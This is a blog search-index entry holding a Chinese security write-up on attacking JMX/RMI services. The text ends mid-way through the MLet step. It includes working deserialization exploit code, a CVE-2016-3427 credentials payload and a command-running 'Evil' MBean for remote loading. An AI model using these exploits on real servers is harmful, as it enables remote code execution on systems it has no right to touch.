<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Attack JMX Service的打开方式</title>
    <link href="/2022/How-to-attack-RMI-based-JMX-services/"/>
    <url>/2022/How-to-attack-RMI-based-JMX-services/</url>
    
    <content type="html"><![CDATA[<p>有次漏洞挖掘项目中碰到了未授权JMX的情况，在复盘时发现对于整套攻击JMX服务的方式不太了解。趁着最近有时间 对JMX相关知识来次补充，遂写了此文。主要对JMX服务未鉴权时的利用方式、JMX各账户权限可对应执行的操作、Oracle官方对于漏洞的修复、鉴权后的攻击利用方式做了分析演示。在梳理完此文后基本上对攻击JMX服务有底了，也成功利用这些特性PWN掉了***产品，中间的过程也比较有趣，等有机会再做分享…</p><h2 id="1、基础知识"><a href="#1、基础知识" class="headerlink" title="1、基础知识"></a>1、基础知识</h2><p>JMX是JAVA1.5引入的新特性，全称为Java Management Extension，即Java管理扩展，是管理&#x2F;监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里例子中的MBean类是Hello，接口为HelloMBean</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//Hello.java</span><br>package org.<span class="hljs-property">example</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> newName</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = newName;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello: &quot;</span> + name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HelloMBean接口：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//HelloMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<br>    <span class="hljs-comment">// getter and setter for the attribute &quot;name&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getName();<br>    <span class="hljs-keyword">public</span> void setName(<span class="hljs-keyword">String</span> <span class="hljs-keyword">new</span><span class="hljs-type">Name</span>);<br>    <span class="hljs-comment">// Bean method &quot;sayHello&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于管理器而言，这些MBean中公开的方法，最终会被JMX转化为属性（ Attribute ）、调用（ Invoke ）、监听（ Listener ）等概念。默认情况下每个Java进程都运行着MBean管理服务，使用<code>ManagementFactory.getPlatformMBeanServer()</code>获取到MBeanServer后可对MBean进行操作。下面的例子模拟管理器注册MBean并显示当前java进程中的所有MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/1.png"></p><p>如果想让我们的MBean在管理器上可调用，那么需要指定一个<code>ObjectName</code>对象，关于对象名称的详细语法可参考：<a href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html%E3%80%82">https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html。</a></p><p> Object Name 在注册MBean时用于指定名称，在查询的时候可以指定正则用于查询，去匹配名称符合正则条件的MBean。每个Object Name都需要包含一个type关键属性</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//MBeanExample.java<br>package org.example;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectInstance;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> MBeanExample &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        // <span class="hljs-keyword">Create</span> a <span class="hljs-built_in">new</span> MBean instance <span class="hljs-keyword">from</span> Hello (HelloMBean interface)<br>        Hello mbean = <span class="hljs-built_in">new</span> Hello();<br>        // <span class="hljs-keyword">Create</span> an <span class="hljs-keyword">object</span> <span class="hljs-type">name</span>,<br>        ObjectName mbeanName = <span class="hljs-built_in">new</span> ObjectName(&quot;org.example.Hello:type=HelloMBean&quot;);<br>        // <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the MBean <span class="hljs-keyword">server</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">current</span> Java process<br>        MBeanServer <span class="hljs-keyword">server</span> = ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-keyword">server</span>.registerMBean(mbean, mbeanName);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> : <span class="hljs-keyword">server</span>.queryMBeans(<span class="hljs-built_in">new</span> ObjectName(&quot;*:*&quot;), <span class="hljs-keyword">null</span>))<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println( ((ObjectInstance)<span class="hljs-keyword">object</span>).getObjectName() );<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Press any key to exit&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用jconsole连接本地的org.example.MBeanExample类起的9052进程后，可以设置MBean的属性&#x2F;调用方法，如我们这里的sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/2.png"></p><p>调用sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/3.png"></p><p>也可以开启远程服务，将Hello、HelloMBean、MBeanExample打包为jmxserver.jar包后，用如下命令开启调试功能、JMX监听端口并设置非认证。这里为演示命令执行的效果，将groovy-2.3.9.jar添加到classpath中，方便我们后续利用Groovy Gadget</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span>  -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/4.png"></p><p>使用nmap扫描其端口可以看到，2222端口MBean管理服务实际上是基于RMI Registry的，对象名称为jmxrmi，stub端口为56139</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/5.png"></p><h2 id="2、攻击JMX"><a href="#2、攻击JMX" class="headerlink" title="2、攻击JMX"></a>2、攻击JMX</h2><p>我们按照整体调用流程、过程中存在的利用点、官方对漏洞的修复措施及后续利用进行分析，也为了方便理解，个人将攻击JMX服务分为5种利用方式：</p><p>1、jmx-url连接地址可控的JNDI注入利用方式</p><p>2、攻击RMI Registry的利用方式</p><p>3、RMI层”自定义”方法newClient利用方式</p><p>4、JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</p><p>5、MLET动态加载Evil MBean的利用方式</p><p>第一种是针对JMX客户端的利用方式，也捎带看一下。后面几种都是针对JMX服务，其中234都需要目标ClassPath存在可用的Gadget链，而第5个MLET动态加载是载入执行攻击者创建的恶意MBean类方法，所以没有Gadget的限制。从整体看，JMX客户端与服务端交互的流程及利用点如下:</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，<strong>当JMX url可控时，会造成JNDI注入的问题</strong>。这是第一个利用点</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象。当JMX服务需要验证时，会使用JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象。<br>这部分会涉及两个利用点：<br>a、JMX底层是依据RMI进行通信，当JDK版本在低版本时，可以使用攻击RMI Registry的exp进行攻击，<strong>可利用bind&#x2F;lookup方法传输恶意序列数据&#x2F;UnicastRef链利用</strong>。这是第二个利用点<br>b、newClient方法符合我们在攻击RMI中提到的<strong>应用层反序列化问题</strong>情况，参数为Object类型，可以塞入我们的恶意Padyload数据。这是第三个利用点</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息<br>这部分会涉及两个攻击点：<br>a、JMX层在<strong>还原MBean方法参数时也是采用反序列化方式</strong>进行还原的，所以可将恶意数据塞入默认MBean的有参方法。这是第四个利用点<br>b、在客户端连接成功创建MBean时，<strong>可调用MLET动态加载的方式去加载攻击者构建的Evil MBean完成利用</strong>。这是第五个利用点</p><p>下面是详细分析及密码验证后的绕过方式</p><h3 id="2-1-jmx-url连接地址可控的JNDI注入利用方式"><a href="#2-1-jmx-url连接地址可控的JNDI注入利用方式" class="headerlink" title="2.1 jmx-url连接地址可控的JNDI注入利用方式"></a>2.1 jmx-url连接地址可控的JNDI注入利用方式</h3><p>使用Java代码JMXConnectorFactory#connect连接JMX服务端时，会调用到InitialContext#lookup去获取名称为”jmxrmi”的远端对象。当JMX url可控时，会造成JNDI注入的问题，调用栈及演示如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">JMX JNDI Gadget:<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.JMXConnectorFactory</span><span class="hljs-selector-class">.connect</span>(JMXConnectorFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">270</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">287</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServer</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1922</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServerJNDI</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1955</span>)<br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.lookup</span>(InitialContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">417</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/6.png"></p><p>起个恶意LDAP服务，javaReferenceAddress放置我们的Groovy1链的Padyload，可以看到JMX客户端在JDK高版本的情况下成功触发命令执行。绕过原理见先前文章：<a href="https://pwnull.github.io/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/7.png"></p><p>JMX JNDI注入调用栈：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/8.png"></p><h3 id="2-2-攻击RMI-Registry的利用方式"><a href="#2-2-攻击RMI-Registry的利用方式" class="headerlink" title="2.2 攻击RMI Registry的利用方式"></a>2.2 攻击RMI Registry的利用方式</h3><p>因为JMX底层也是依据RMI进行通信，所以当JDK版本在低版本时，也可以使用攻击RMI Registry的exp进行攻击。且这种攻击方式的触发点是在RMI层，还未执行到JMX权限校验部分，所以不受JMX权限的限制</p><p>JEP290前的JDK8u112版本，使用默认ysoserial中的ysoserial.exploit.RMIRegistryExploit测试成功</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/9.png"></p><p>JEP290后的JDK131版本使用 UnicastRef 链绕过成功、141可使用改造后的lookup()+UnicastRef 链进行绕过</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/10.png"></p><p>测试JDK191版本下，在sun.management.jmxremote.SingleEntryRegistry#singleRegistryFilter触发检查，导致反序列化失败。</p><p>JMX服务端调试情况，在singleRegistryFilter触发白名单检查报错</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/11.png"></p><p>攻击端：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/12.png"></p><h3 id="2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427"><a href="#2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427" class="headerlink" title="2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427"></a>2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427</h3><p>当客户端使用<code>JMXConnectorFactory.connect</code>去连接服务端时，最终调用到<code>javax.management.remote.rmi.RMIServerImpl_Stub#newClient</code>发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：newClient方法参数为Object类型，可以塞入我们的恶意Padyload（利用JMXConnector.CREDENTIALS配置添加），exp如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>    <span class="hljs-keyword">Object</span> obj = <span class="hljs-built_in">new</span> Groovy1().getObject(&quot;calc&quot;);<br>    connectWithJmxUrlByObject(obj);<br>&#125;<br><br>private static <span class="hljs-type">void</span> connectWithJmxUrlByObject(<span class="hljs-keyword">Object</span> credentials) throws MalformedURLException, IOException &#123;<br>    String url = &quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;;<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Trying to connect to &quot; + url + &quot; ...&quot;);<br>    Map&lt;String, <span class="hljs-keyword">Object</span>&gt; props = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();<br>    props.put(JMXConnector.CREDENTIALS, credentials);<br>    JMXConnector connector = JMXConnectorFactory.<span class="hljs-keyword">connect</span>(<span class="hljs-built_in">new</span> JMXServiceURL(url), props);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connected: &quot; + connector.getConnectionId());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println();<br>    connector.<span class="hljs-keyword">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>成功在JDK8u77-JMX服务上执行成功：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/13.png"></p><p>该漏洞在JDK8u91时被修复，新增了javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper类继承自DeserializationChecker接口，该类实现了check、checkProxyClass方法检查参数类型，限制只能为[Ljava.lang.String;、java.lang.String类型。</p><p>在该版本的环境下，RMI层使用sun.rmi.server.UnicastServerRef#unmarshalParameters方法还原”自定义方法”参数时，由于jmx服务注册Target的weakImpl#referent为ExportedWrapper，所以在还原操作时会调用到ExportedWrapper#check检查序列化是否在白名单中，很显然Groovy1外部包装类AnnotationInvocationHandler不在白名单中，反序列化操作报错</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/14.png"></p><p>javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper实现DeserializationChecker接口</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/15.png"></p><p>JMX服务端调用sun.rmi.server.UnicastServerRef#unmarshalParameters还原newClient的参数：由于实现了DeserializationChecker接口，所以会走checked流程。普通RMI服务的自定义方法会走unchecked流程</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/16.png"></p><p>服务端执行反序列化操作还原参数检查白名单：javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#check</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/17.png"></p><p>此漏洞被分配编号<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">CVE-2016-3427</a>，在JDK8u91时被<a href="https://www.oracle.com/java/technologies/javase/8u91-relnotes.html">修复</a></p><h3 id="2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式"><a href="#2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式" class="headerlink" title="2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式"></a>2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</h3><p>当JMX客户端调用createMBean&#x2F;getObjectInstance&#x2F;invoke等方法时，服务端处理时会先经过sun.rmi.server.UnicastServerRef#dispatch进行分发，当不执行RMI内置的bind&#x2F;lookup&#x2F;dirty方法时，会进入”调用自定义方法”的逻辑</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/18.png"></p><p>客户端调用createMBean&#x2F;getAttribute等内置方法时，服务端到达javax.management.remote.rmi.RMIConnectionImpl#invoke中：</p><p>1、调用java.rmi.MarshalledObject#get还原参数值</p><p>2、调用到javax.management.remote.rmi.RMIConnectionImpl#doOperation根据客户端调用具体方法进行分发处理，包括createMBean、getAttribute、getObjectInstance、getObjectInstance等方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/19.png"></p><p>java.rmi.MarshalledObject#get</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/20.png"></p><p>javax.management.remote.rmi.RMIConnectionImpl#doOperation</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/21.png"></p><p>在使用java.rmi.MarshalledObject#get还原调用方法的参数值时，会直接调用readObject进行反序列化操作。我们只需要找到MBean中带参数的方法，将我们的恶意数据填充即可，对应exp为ysoserial中的ysoserial.exploit.JMXInvokeMBean，该exp通过调用对象名称为”java.util.logging:type&#x3D;Logging”的MBean的getLoggerLevel方法触发</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String servicePort = <span class="hljs-string">&quot;2222&quot;</span>;<br>JMXServiceURL url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">servicePort</span> +  <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector jmxConnector = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(url);<br>MBeanServerConnection mbeanServerConnection = jmxConnector.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br>Object payloadObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utils</span>.</span></span>make<span class="hljs-constructor">PayloadObject(<span class="hljs-string">&quot;Groovy1&quot;</span>, <span class="hljs-string">&quot;mspaint.exe&quot;</span>)</span>;<br>ObjectName mbeanName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectName(<span class="hljs-string">&quot;java.util.logging:type=Logging&quot;</span>)</span>;<br>mbeanServerConnection.invoke(mbeanName, <span class="hljs-string">&quot;getLoggerLevel&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;payloadObject&#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">CanonicalName()</span>&#125;);<br>jmxConnector.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/22.png"></p><p>jconsole查看java.util.logging:type&#x3D;Logging为默认的MBean，另外还有很多MBean的方法也可以用：java.lang:type&#x3D;Threading#getThreadCpuTime、java.lang:type&#x3D;Threading#getThreadInfo、com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram等等</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/23.png"></p><p>com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/24.png"></p><h3 id="2-5-MLET动态加载Evil-MBean利用方式"><a href="#2-5-MLET动态加载Evil-MBean利用方式" class="headerlink" title="2.5 MLET动态加载Evil MBean利用方式"></a>2.5 MLET动态加载Evil MBean利用方式</h3><p>除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用<code>javax.management.loading.MLet</code> MBean 并调用其getMBeansFromURL操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的的MBean操作而不需要服务端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也有说明 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/25.png"></p><p>分析下getMBeansFromURL方法是如何操作的，javax.management.loading.MLet#getMBeansFromURL(java.lang.String)中分为2步：</p><p>1、加载mlet文件解析标签</p><p>2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址（第一步得到的codebase+archive属性值）进行加载</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/26.png"></p><p>javax.management.loading.MLetParser#parse解析<code>&lt;mlet&gt;</code>标签的内容并放入attributes</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/27.png"></p><p>接着返回到getMBeansFromURL方法调用com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean创建MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/28.png"></p><p>调用到com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/29.png"></p><p>最终在 com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass中使用MLET classloader去加载org.example.Evil类（codesource就是mlet文件中codebase+archive属性值）。这里使用<code>Class.forName(className, false, loader);</code>初始化的选项为false，不会执行静态代码块中的代码。所以我们需要选择invoke调用MBean的恶意方法进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/30.png"></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/31.png"></p><p>针对前文在2222端口开启的JMX服务，复现下MLET这种利用方法：</p><p>1、创建Evil类及EvilMBean接口（恶意操作为runCommand），并将其打包为JmxEvilBean.jar</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//EvilMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);<br>&#125;<br><br><span class="hljs-comment">//Evil.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd)<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            Process proc = rt.exec(cmd);<br>            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));<br>            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));<br>            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">String</span> s;<br>            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            proc.waitFor();<br>            <span class="hljs-keyword">return</span> stdout_err_data;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、创建MLET文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;mlet <span class="hljs-attribute">code</span>=<span class="hljs-string">&quot;org.example.Evil&quot;</span> <span class="hljs-attribute">archive</span>=<span class="hljs-string">&quot;JmxEvilBean.jar&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;MLetCompromise:name=evil,id=10&quot;</span> <span class="hljs-attribute">codebase</span>=<span 